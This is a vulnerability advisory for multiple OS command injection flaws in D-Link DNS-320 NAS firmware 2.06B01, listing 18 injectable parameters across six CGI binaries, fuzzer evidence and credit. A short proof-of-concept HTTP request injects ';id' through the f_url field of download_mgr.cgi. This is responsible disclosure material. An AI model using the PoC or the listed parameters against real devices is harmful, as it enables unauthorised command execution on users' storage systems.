## D-Link DNS-320 download_mgr/webdav_mgr/remote_backup Multiple OS Command Injection

### Title

```
D-Link DNS-320 download_mgr/webdav_mgr/remote_backup Multiple OS Command Injection
```

### Vendor / Product / Version

```
D-Link Corporation / DNS-320 ShareCenter NAS (Rev.A) / Firmware 2.06B01 HOTFIX
```

### Component

```
download_mgr.cgi (10 vulns), webdav_mgr.cgi (2 vulns), remote_backup.cgi (3 vulns),
s3.cgi (1 vuln), time_machine.cgi (1 vuln), apkg_mgr.cgi (1 vuln)
```

### Vulnerability Type

```
CWE-78: OS Command Injection
```

### CVSS 3.1

```
8.8 (High) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
Multiple OS command injection vulnerabilities across 6 CGI binaries in
D-Link DNS-320 firmware 2.06B01. All follow the same pattern:
cgiFormString() → sprintf() → system() without sanitization.

download_mgr.cgi (10 functions): rss_perform command injection via
f_url, f_id, f_item_id, f_download, f_field, f_dir, f_user, f_pwd, etc.

webdav_mgr.cgi (2 functions): makedav command injection via f_share_name.
remote_backup.cgi (3 functions): rsyncmd/rsyncom injection via name, f_password.
s3.cgi (1 function): s3 schedule injection via f_job_name.
time_machine.cgi (1 function): avahi_tm_serv injection via name.
apkg_mgr.cgi (1 function): addons_follow-up.sh injection via f_module_name.

Verification: Unicorn Fuzzer CONFIRMED download_mgr cgi_add_rss (2 crashes)
and remote_backup cgi_backup (1 crash).
```

### Proof of Concept

```http
POST /cgi-bin/download_mgr/download_mgr.cgi HTTP/1.1
Host: <target>
Cookie: <valid_session>

cmd=cgi_add_rss&f_url=;id&f_movedir=/tmp
```

### Unicorn Fuzzer Evidence

```json
[
  {"target_id": "dlink@@DNS320@@download_mgr@@0xcbe0", "crash_type": "command_injection", "severity": "confirmed", "crashes": 2},
  {"target_id": "dlink@@DNS320@@remote_backup@@0x9e34", "crash_type": "command_injection", "severity": "confirmed", "crashes": 1}
]
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution + Unicorn Fuzzer engine.
```

